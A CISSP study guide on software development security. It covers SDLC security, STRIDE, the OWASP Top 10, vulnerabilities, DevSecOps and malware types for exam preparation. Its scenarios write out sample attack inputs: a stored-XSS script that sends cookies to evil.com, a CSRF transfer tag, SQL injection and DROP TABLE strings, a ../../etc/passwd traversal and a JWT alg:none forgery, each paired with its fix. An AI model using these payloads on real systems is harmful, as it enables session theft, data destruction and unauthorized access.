# Domain 8 — Software Development Security

**Exam Weight: 10%**

---

## 8.1 Software Development Lifecycle (SDLC)

### SDLC Models

| Model | Description | Security Fit |
|-------|-------------|-------------|
| **Waterfall** | Sequential phases; requirements locked early | Hard to add security late |
| **Agile** | Iterative sprints; flexible requirements | Security in each sprint (DevSecOps) |
| **Spiral** | Risk-driven; iterative with risk analysis | Good for high-assurance systems |
| **RAD** (Rapid Application Development) | Fast prototyping; user feedback | Risk: security skipped for speed |
| **DevOps** | Continuous delivery; Dev + Ops collaboration | Requires integrated security (DevSecOps) |
| **DevSecOps** | Security embedded throughout pipeline | Ideal model; "shift left" |

### "Shift Left" Security
Embedding security activities earlier (left) in the SDLC rather than bolting on at the end. Earlier defects are cheaper to fix:
- Requirement defect found in design: ~10x cost to fix
- Requirement defect found in production: ~100x cost to fix

> **Critical CISSP Rule — Security Placement in SDLC:**
> Security MUST be implemented starting in the **Initiation/Requirements phase** of the SDLC. If security is "bolted on" after development is complete, it becomes a non-functional requirement that is easily deprioritized, deferred, or cut entirely when budget or time is constrained. The rule: security requirements must be defined **before a single line of code is written**, not discovered at a pen test one week before launch.

> **Scenario — Why "Shift Left" Saves Money:**
> A development team builds a healthcare portal over 6 months. They do no security testing during development and run a penetration test one week before launch. The pentest finds:
> - All API endpoints lack authentication (architectural design flaw)
> - Passwords stored in plaintext in the database (design decision)
> - No audit logging at all (requirement was missed)
>
> Fixing these requires: redesigning the API authentication layer, migrating the password storage, and adding audit trails throughout the entire codebase. 4 months of rework. Launch delayed.
>
> If a threat model had been done in the **design phase** and a security checklist had been in the **requirements phase**, these would have been caught before a single line of code was written. The same fixes cost a fraction of the effort to implement from the start vs. retrofitting them into 6 months of built code.
>
> **Waterfall vs. Agile security:** In Waterfall, security is often added only at the end (pen test before go-live) — all vulnerabilities surface at the worst time. In Agile/DevSecOps, each 2-week sprint includes a security story, automated SAST runs in CI, and DAST runs at end of sprint — problems are caught when the affected code is only 2 weeks old, not 6 months.

---

## 8.2 Security in Each SDLC Phase

### Requirements Phase
- Define **security requirements** alongside functional requirements
- Create **misuse cases** — scenarios describing how system could be abused
- Define **privacy requirements** (GDPR, HIPAA compliance)
- Establish **security acceptance criteria**

### Design Phase
**Threat Modeling** — identify threats before writing code.

#### STRIDE Threat Model (Microsoft)

| Threat | Violates | Example |
|--------|---------|---------|
| **S**poofing | Authentication | Impersonating a user |
| **T**ampering | Integrity | Modifying data in transit |
| **R**epudiation | Non-repudiation | Denying having performed an action |
| **I**nformation Disclosure | Confidentiality | Data leakage |
| **D**enial of Service | Availability | Crashing the service |
| **E**levation of Privilege | Authorization | Gaining admin access without authorization |

> **Scenario — STRIDE Applied to a Banking App Login:**
> Apply STRIDE to the login feature of a mobile banking app:
>
> - **Spoofing:** Attacker creates a fake bank app that looks identical — users enter credentials into the fake app. Countermeasure: certificate pinning (app only trusts the bank's specific certificate), app store signing.
> - **Tampering:** Attacker intercepts the login request and modifies the username field to log in as a different user. Countermeasure: TLS with integrity (GCM mode prevents tampering in transit).
> - **Repudiation:** A fraudulent transaction is made from an account, and the user denies it. Was it them? Countermeasure: immutable audit logs, digital signatures on transaction requests, IP/device logging.
> - **Information Disclosure:** Login error message says "username not found" vs. "wrong password" — attacker learns which usernames are valid. Countermeasure: generic "invalid credentials" error for both cases.
> - **Denial of Service:** Attacker scripts 1,000 login attempts per second to lock out all users (account lockout DoS). Countermeasure: CAPTCHA, rate limiting, progressive delays.
> - **Elevation of Privilege:** A regular user manipulates their JWT token to set `"role": "admin"`. Countermeasure: validate JWT signature server-side; never trust client-provided role claims.

#### PASTA (Process for Attack Simulation and Threat Analysis)
7-stage risk-centric threat modeling methodology:
1. Define objectives
2. Define technical scope
3. Decompose application
4. Analyze threats
5. Identify vulnerabilities
6. Enumerate attacks
7. Analyze risk / impact

#### DREAD (risk scoring)
Damage, Reproducibility, Exploitability, Affected users, Discoverability — score 1-10 each.

#### Attack Trees
Hierarchical diagrams showing how an attacker can achieve a goal, with subtechniques as branches.

### Development Phase
- **Secure coding standards** (OWASP Secure Coding Practices)
- **Peer code reviews** — manual inspection for vulnerabilities
- **Static Application Security Testing (SAST)** — analyze source code without executing it
- Input validation, output encoding, error handling, logging

### Testing Phase

| Method | Type | Description |
|--------|------|-------------|
| **SAST** | White-box | Static code analysis; finds source-code vulnerabilities |
| **DAST** | Black-box | Tests running application without source code access |
| **IAST** | Grey-box | Instruments running app; best coverage |
| **Fuzz testing** | Black-box | Sends malformed/random inputs to find crashes/vulnerabilities |
| **Penetration testing** | Black/Grey/White | Simulates real attacker; tests defenses |
| **Code review** | White-box | Manual or automated inspection of source code |

### Deployment Phase
- Secure configuration (remove defaults, disable unnecessary features)
- **Secrets management** — no hardcoded passwords/API keys in code
- **CI/CD pipeline security** — scan artifacts, sign deployments
- Verify security controls in production configuration

### Maintenance Phase
- Ongoing vulnerability scanning
- Patch management
- Security regression testing after updates
- Bug bounty programs

---

## 8.3 OWASP Top 10 (2021)

| Rank | Vulnerability | Key Prevention |
|------|--------------|---------------|
| A01 | **Broken Access Control** | Enforce access control server-side; deny by default |
| A02 | **Cryptographic Failures** | Use TLS; encrypt sensitive data; strong algorithms |
| A03 | **Injection** (SQL, Command, LDAP) | Parameterized queries; input validation |
| A04 | **Insecure Design** | Threat modeling; secure design patterns |
| A05 | **Security Misconfiguration** | Hardening; disable defaults; configuration review |
| A06 | **Vulnerable & Outdated Components** | Inventory; patch; SBOM |
| A07 | **Identification & Authentication Failures** | MFA; secure session management; no hardcoded credentials |
| A08 | **Software & Data Integrity Failures** | Code signing; verify dependencies; CI/CD integrity |
| A09 | **Security Logging & Monitoring Failures** | Log security events; alert on anomalies |
| A10 | **Server-Side Request Forgery (SSRF)** | Validate/sanitize URLs; network segmentation |

---

## 8.4 Common Vulnerabilities in Detail

### SQL Injection
Attacker inserts SQL code into input fields to manipulate database queries.

**Vulnerable:**
```sql
SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
```

**Exploit input:** `' OR '1'='1`

**Prevention:**
- **Parameterized queries / prepared statements** (most effective)
- Stored procedures (with parameters, not dynamic SQL)
- ORM frameworks
- Input validation (whitelist)
- Least privilege on database accounts

> **Scenario — SQL Injection Step by Step:**
> A login form sends: `SELECT * FROM users WHERE username = 'admin' AND password = 'password123'`
>
> Attacker enters username: `admin' --`
> The query becomes: `SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'`
> The `--` comments out everything after it — the password check is eliminated. The attacker logs in as admin with no password.
>
> More destructive: username = `'; DROP TABLE users; --`
> Query: `SELECT... WHERE username = ''; DROP TABLE users; --`
> Entire users table is deleted.
>
> **Parameterized query fix:**
> ```sql
> SELECT * FROM users WHERE username = ? AND password = ?
> ```
> The `?` are bound to the input values AFTER the query structure is compiled. The database treats the input as pure data, never as SQL syntax. `admin' --` becomes the literal string "admin' --" — it can't break out of the data context.
>
> **Why stored procedures aren't always enough:** A stored procedure that builds SQL dynamically inside it using string concatenation still has the vulnerability. The procedure must use parameterized inputs internally.

### Cross-Site Scripting (XSS)
Attacker injects malicious scripts into web pages viewed by other users.

| Type | How | Example |
|------|-----|---------|
| **Stored XSS** | Malicious script saved to database; served to all visitors | Comment field with `<script>` tag |
| **Reflected XSS** | Script in URL parameter; reflected in response | Phishing link with script in query string |
| **DOM-based XSS** | Client-side script manipulates DOM unsafely | JavaScript reading `document.location` |

**Prevention:** Output encoding/escaping; Content Security Policy (CSP); input validation.

> **Scenario — Stored XSS in a Comment System:**
> A blog site allows comments without sanitizing input. Attacker posts the comment: `<script>document.location='https://evil.com/steal?c='+document.cookie</script>`
>
> This gets saved to the database. Every time any user loads the blog post, the script runs in their browser — silently sending their session cookie to the attacker's server. The attacker takes the session cookie, replays it, and is now logged in as that user with no password needed.
>
> **Output encoding fix:** When the comment is displayed, encode `<` as `&lt;` and `>` as `&gt;`. The browser renders the text literally — users see the tag text, not execute it as code.
>
> **Reflected XSS vs. Stored XSS distinction:** Stored XSS persists in the database and hits ALL visitors — maximum impact. Reflected XSS exists only in a specially crafted URL — the attacker must trick each victim into clicking the malicious link individually.
>
> **CSRF Scenario:**
> A user is logged into their bank at bank.com. In the same browser, they visit a malicious site (attacker.com). That site has hidden HTML: `<img src="https://bank.com/transfer?to=attacker&amount=5000">`. When the browser loads the image tag, it sends a GET request to bank.com — and because the user is still logged in, their session cookie goes along automatically. The bank processes the transfer.
>
> **CSRF token fix:** The bank embeds a unique, unpredictable token in the transfer form. The request is only valid if it includes this token. The attacker's site can't read the token from bank.com (same-origin policy) — so their forged request lacks it and the bank rejects it.

### Cross-Site Request Forgery (CSRF)
Forces authenticated user's browser to submit an unwanted request to the application.

**Prevention:** CSRF tokens (synchronizer token pattern); SameSite cookies; Referer header validation.

### Buffer Overflow
Writing more data to a buffer than it can hold; can overwrite adjacent memory, leading to code execution.

**Prevention:** Bounds checking; safe functions (strncpy vs strcpy); ASLR; DEP/NX bit; stack canaries.

> **Scenario — Buffer Overflow Prevention Mechanisms:**
> A C program: `char buffer[100]; gets(buffer);` — `gets()` doesn't check length. Input of 200 characters overflows the buffer, overwrites the return address on the stack, and redirects execution to attacker-controlled shellcode.
>
> Modern defenses work in layers:
> - **Stack canary:** Compiler places a random value before the return address. Before returning, the program checks it's unchanged. An overflow overwrites it — program aborts.
> - **ASLR:** OS randomizes where stack, heap, and libraries load. The attacker can't hardcode the shellcode address — it changes every run.
> - **DEP/NX bit:** Marks memory as either executable OR writable, never both. Injected shellcode sits in the stack (data region) — CPU refuses to execute it.
>
> **Path traversal scenario:** A web app has: `file = request.params["name"]; readFile("/uploads/" + file)`. Attacker sends `name=../../etc/passwd`. The server reads `/uploads/../../etc/passwd` = `/etc/passwd` — the Linux password file. Fix: canonicalize the path and verify it starts with the allowed base directory.

### Insecure Deserialization
Malicious data crafted to exploit deserialization logic, often leading to Remote Code Execution (RCE).

**Prevention:** Never deserialize untrusted data; integrity checks on serialized data; type checking.

### Path Traversal
Using `../` sequences to navigate outside intended directory and access files.

**Prevention:** Input validation; canonicalization; chroot jails; server-side path resolution.

---

## 8.5 Database Security

### Polyinstantiation
A database security technique where **two or more different versions of the same data** (same primary key) exist at **different classification levels**. Subjects only see data at or below their clearance — prevents **inference attacks** and maintains **integrity** in multilevel security (MLS) databases.

**Example:** A "SALARY" field in an employee record might show $50,000 to SECRET-cleared users but $0 (fake/null) to UNCLASSIFIED users. The lower-level user sees a plausible but sanitized record — they can't detect that a higher-classification record exists for the same primary key.

> **Why Polyinstantiation Prevents Inference:**
> Without it: an UNCLASSIFIED user queries "Colonel Smith's salary" and gets "Record not found." The error itself reveals that Colonel Smith's record exists at a higher classification — an inference attack.
>
> With polyinstantiation: a fake record exists at UNCLASSIFIED level showing salary = $0 (a sanitized decoy). The user sees a record and learns nothing about the real data. Two instances of the same primary key exist — one per classification level.
>
> **The CISSP key:** Polyinstantiation creates two different versions of the same data to prevent inference attacks and maintain integrity across classification levels. This is a MLS database control, not a general-purpose technique.

> **Scenario — Polyinstantiation Preventing Inference:**
> Without polyinstantiation: An UNCLASSIFIED user queries the personnel database for "Colonel Smith's salary" and gets an error: "Record not found." The error itself reveals information — Colonel Smith exists in the database at a higher classification level. This is an inference attack.
>
> With polyinstantiation: The database creates a fake record at the UNCLASSIFIED level for Colonel Smith showing salary = $0 (or a plausible decoy value). The unclassified user sees the record but gets sanitized data. They learn nothing about the real salary. The real record (with real salary) exists only at the SECRET classification level.
>
> **The concept:** Multiple instances of the same primary key exist — one per classification level. Access control determines which instance a user sees. This is complex to implement and only used in high-assurance military/government MLS (Multi-Level Security) databases.

### Database Access Controls
- **Principle of least privilege** — application accounts only need SELECT, not DROP/ALTER
- **Separation of duties** — separate accounts for admin, app, reporting
- **Database activity monitoring (DAM)** — log and alert on suspicious queries
- **Views** — restrict visible columns/rows without changing underlying table

### Preventing SQL Injection

```
User input → Parameterized query (bind variables) → Database
```
Never concatenate user input into SQL strings.

---

## 8.6 DevSecOps and CI/CD Security

### DevSecOps Principles
- Security is everyone's responsibility, not just the security team
- Automate security testing in the pipeline
- Fail fast — catch vulnerabilities before they reach production
- Treat infrastructure as code (IaC) and scan it

### CI/CD Pipeline Security Gates

```
Code Commit → SAST Scan → Dependency Check → Build → Container Scan → DAST → Deploy → Runtime Monitoring
```

| Stage | Security Activity |
|-------|-----------------|
| **Commit** | Pre-commit hooks; secrets detection |
| **Build** | SAST; dependency vulnerability scan (SCA) |
| **Test** | DAST; IAST; unit security tests |
| **Package** | Container image scanning; code signing |
| **Deploy** | IaC security scanning; configuration review |
| **Operate** | Runtime protection (RASP); monitoring |

### Secrets Management
- **Never hardcode** credentials, API keys, or passwords in source code
- Use secrets managers: HashiCorp Vault, AWS Secrets Manager, Azure Key Vault
- Rotate secrets regularly
- Scan repos for accidentally committed secrets (GitLeaks, truffleHog)

### Container Security
- Use minimal base images (reduce attack surface)
- Scan images for CVEs before deployment
- Run containers as non-root
- Implement network policies (pod-to-pod)
- Use image signing and verification

---

## 8.7 Acquired Software Security

### Commercial Off-the-Shelf (COTS) Software
- Evaluate vendor's security practices and vulnerability disclosure policy
- Review known CVEs before procurement
- Test in isolated environment before production

### Open Source Software (OSS)
- Audit license compliance (GPL, MIT, Apache)
- Track dependencies for known vulnerabilities (CVE databases)
- Use Software Composition Analysis (SCA) tools

### Software Bill of Materials (SBOM)
A formal, machine-readable inventory of all components in a software product:
- Libraries, frameworks, versions
- Known vulnerabilities
- License information
- Required by US Executive Order 14028 (2021) for federal software

---

## 8.8 API Security

| Threat | Prevention |
|--------|-----------|
| **Broken Object Level Authorization (BOLA/IDOR)** | Validate user owns the resource |
| **Broken Authentication** | OAuth 2.0; API keys; MFA |
| **Excessive Data Exposure** | Return only necessary fields |
| **Rate Limiting Absent** | Implement throttling/rate limits |
| **Injection** | Validate/sanitize all API inputs |
| **Man-in-the-Middle** | Enforce TLS; certificate pinning |

**JWT (JSON Web Token):** Used for API authentication. Contains header, payload, signature. Validate the signature; check expiration (`exp`); never trust client-controlled algorithm (`alg: none` attack).

> **Scenario — JWT `alg:none` Attack:**
> A JWT looks like: `header.payload.signature` — all base64-encoded. Header: `{"alg":"HS256","typ":"JWT"}`. An attacker modifies their JWT's payload: `{"userId": 1, "role": "admin"}` and changes the header to `{"alg":"none"}`. With `alg:none`, no signature is required. A vulnerable server that honors the client's algorithm choice accepts this unsigned token and grants admin access.
>
> **Fix:** The server must enforce the expected algorithm — never trust the `alg` header from the client. Always specify `alg=HS256` (or RS256) server-side when validating tokens.
>
> **BOLA/IDOR Scenario:** An e-commerce API has: `GET /api/orders/{order_id}`. A customer with order ID 12345 tries `GET /api/orders/12346` — another customer's order. The API returns the other customer's data because it only checks "is the user authenticated?" not "does this user OWN order 12346?" This is Broken Object Level Authorization (BOLA/IDOR). Fix: every request must verify the authenticated user owns or is authorized to access the specific resource being requested.

> **Scenario — Certification vs. Accreditation (C&A) / ATO:**
> A new government system has been built. Before it can go into production:
>
> **Certification (technical evaluation):** The security assessment team tests all controls — scans, pen test, code review, configuration review. They produce a report: "System has these 3 high findings, 8 medium findings. Controls are generally effective." They certify (technically verify) that the system meets the security requirements.
>
> **Accreditation (ATO):** The Authorizing Official (AO) — a senior manager, not a technical person — reviews the certification report. They look at the residual risk, the business need, and the cost to fix remaining findings. They sign the Authority to Operate (ATO): "I accept the residual risk and authorize this system to operate for the next 3 years." The AO doesn't fix vulnerabilities — they accept the remaining risk on behalf of the organization.
>
> **Exam trap:** "Who grants the ATO?" → Management (the Authorizing Official), NOT the security team. The security team certifies (technical verification). Management accredits (accepts risk and authorizes operation). These are always different people.

---

## 8.9 Software Assurance and Acceptance

### Software Testing Terminology
| Term | Description |
|------|-------------|
| **Unit testing** | Testing individual functions/components in isolation |
| **Integration testing** | Testing how components work together |
| **System testing** | Testing the complete system against requirements |
| **Acceptance testing (UAT)** | User verifies system meets business requirements |
| **Regression testing** | Re-testing after changes to ensure no breakage |
| **Stress/Load testing** | Performance under heavy load |

### Certification vs. Accreditation (C&A)
| Term | Description |
|------|-------------|
| **Certification** | Technical evaluation verifying security controls meet requirements |
| **Accreditation** | Management's formal acceptance of residual risk and authorization to operate |
| **ATO (Authorization to Operate)** | NIST RMF term replacing "accreditation" |

> **Exam Tip:** Management (not the security team) grants accreditation/ATO — they accept the residual risk.

---

## 8.10 Malware Types and Software Threats

### Malware Classification
| Type | Description | Key Characteristic |
|------|-------------|------------------|
| **Virus** | Self-replicates by infecting files; needs host | Requires user to execute infected file |
| **Worm** | Self-replicating; spreads autonomously over network | No host file needed |
| **Trojan** | Appears benign; hides malicious code | Doesn't self-replicate |
| **Rootkit** | Hides itself and other malware at OS/kernel level | Evades detection; requires privileged access |
| **Ransomware** | Encrypts data; demands payment | Combines crypto + extortion |
| **Spyware** | Covertly monitors user activity | Keyloggers, screen capture |
| **Botnet/Bot** | Compromised system controlled by C2 server | Used for DDoS, spam, credential theft |
| **Logic Bomb** | Dormant code triggered by a condition | Time, event, or condition triggered |
| **Backdoor** | Undocumented access point | Bypasses normal authentication |
| **Adware** | Displays unwanted ads; may track browsing | Lowest severity; often bundled with freeware |

> **Scenario — Malware Type Distinctions (the tricky ones):**
>
> **Virus vs. Worm:** A macro virus in a Word document sits dormant until you open the file and it infects other Word documents on the same machine. It NEEDS a host (the .doc file) and needs YOU to execute it (open the document). A worm like WannaCry scans the network for port 445, finds an unpatched Windows machine, exploits it, and installs itself — with no user interaction and no host file needed. Worms are far more dangerous for rapid spread.
>
> **Trojan vs. Backdoor:** A Trojan is the delivery mechanism (disguised as a useful app — "free PDF converter"). Once you run it, it installs a backdoor. The backdoor is the actual persistent access mechanism. The Trojan doesn't self-replicate; the backdoor just sits and waits for the attacker to connect.
>
> **Logic Bomb scenario:** A disgruntled sysadmin embeds code in the HR system: "IF date = 'first Monday after my employment ends' THEN DELETE all employee records." After he's fired, the code detonates. How to detect: code reviews, integrity monitoring on production code, separation of duties (developers shouldn't be able to push code to production unreviewed).
>
> **Rootkit scenario:** Attackers compromise a Linux server and install a kernel-level rootkit. The rootkit patches the `ls` command so it never shows the attacker's malware files and patches `netstat` so the C2 connection is invisible. Even an admin looking at the system sees nothing unusual. Detection requires booting from a trusted external media and inspecting the drive from outside the compromised OS, or using trusted integrity tools (Tripwire, AIDE) that hashed files before the compromise.

### Advanced Persistent Threat (APT)
- Nation-state or sophisticated actors
- Long-term, stealthy presence in target network
- Goal: espionage, IP theft, pre-positioning
- Characterized by: targeted, persistent, sophisticated, low-and-slow

---

## 8.11 Code Security Review Techniques

### Secure Code Review Focus Areas
1. **Input validation** — all user input treated as untrusted
2. **Authentication and session management** — no hardcoded credentials; secure token handling
3. **Error handling** — no stack traces or sensitive info in error messages
4. **Cryptography usage** — approved algorithms; proper key management
5. **Access control** — server-side enforcement; no client-side-only checks
6. **Logging** — security events logged; no sensitive data in logs (passwords, PAN)
7. **Third-party dependencies** — known CVE-free; license compliant

### Software Escrow
Agreement where source code is deposited with a neutral third party (escrow agent):
- Released to licensee if vendor goes bankrupt or fails to maintain the product
- Protects organizations dependent on vendor-supplied software
- Common for mission-critical COTS software

---

## 8.12 Agile Security Considerations

### Security in Agile Sprints
| Activity | When |
|----------|------|
| Security story creation | Sprint planning |
| SAST run | During development |
| Code review with security checklist | Pull request review |
| Dependency vulnerability check | CI/CD pipeline |
| DAST against sprint build | End of sprint |
| Security acceptance criteria | Definition of Done |

### Security Debt
- Technical shortcuts that create security vulnerabilities
- Accumulates in fast-moving Agile teams
- Must be tracked, prioritized, and paid down like technical debt
- **Security backlog items** — maintain dedicated security work items in the backlog

---

## 8.13 Change Management in Software — CAB and Emergency Changes

The Change Advisory Board (CAB) and change management apply to software just as much as infrastructure:

- **Standard Change:** Pre-approved, low-risk, follows a documented procedure (e.g., routine library version bump). No CAB meeting needed.
- **Normal Change:** Requires CAB review and approval before implementation. Includes rollback plan.
- **Emergency Change:** Critical security patch (zero-day exploitation in the wild). Expedited approval — but still requires documented authorization from designated approvers (emergency CAB or CISO + change manager). Never bypass entirely.

> **Tricky Scenario:** A critical CVE (CVSS 10.0) is released for a library your application uses, with active exploitation in the wild. The developer says "I can push the patch in 30 minutes, let's skip the CAB." What should happen?
> **Answer:** Invoke the emergency change process. This means: get expedited approval from the designated emergency approvers (not full CAB, but not zero approval either), document the change and reason, ensure there is a rollback plan (can you revert if the patch breaks something?), then deploy. The emergency process exists specifically for this scenario — use it, don't bypass governance entirely. Post-implementation, document and close the emergency change formally.

### Secure SDLC — Where Security Activities Belong

| SDLC Phase | Security Activity | Why Here |
|-----------|------------------|---------|
| **Requirements** | Security/privacy requirements, misuse cases | Define what "secure" means for this system |
| **Design** | Threat modeling (STRIDE), security architecture review | Cheapest time to fix design flaws |
| **Development** | SAST, peer code review, secure coding standards | Catch issues as code is written |
| **Testing** | DAST, IAST, penetration test, fuzz testing | Validate security in running application |
| **Deployment** | Config review, secrets management, IaC scan | Harden before going live |
| **Maintenance** | Continuous scanning, patch management, bug bounty | Sustain security posture over time |

> **Exam rule:** Threat modeling → **design phase**. Penetration testing → **testing/pre-deployment phase**. Patch management → **maintenance phase**. Code review → **development phase**. Questions will try to place these in the wrong phases.

---

## 8.13 Exam Tips Summary

- **SAST** = static analysis (source code, no execution). **DAST** = dynamic (running app, black-box).
- **Parameterized queries** are the #1 defense against SQL injection.
- **Output encoding** is the primary defense against XSS.
- **CSRF tokens** prevent cross-site request forgery.
- **STRIDE** is the threat modeling model to know for CISSP.
- **Polyinstantiation** = database security for multilevel environments.
- **SBOM** = software ingredient list; increasingly required by regulation.
- **Shift left** = find and fix security issues earlier in SDLC.
- Buffer overflows are prevented by input validation and memory-safe languages/compiler features.
- The OWASP Top 10 is tested frequently — know A01-A03 especially well.
- **Accreditation/ATO** = management formally accepts residual risk. Certification = technical verification.
- **Logic bombs** are time/event-triggered; **worms** spread autonomously; **viruses** need host files.
- **APT** = nation-state/sophisticated actors; long-term, stealthy, targeted.
- **Software escrow** protects organizations if vendor discontinues a critical product.
- **IAST** is most accurate testing method — instruments the running app from the inside.
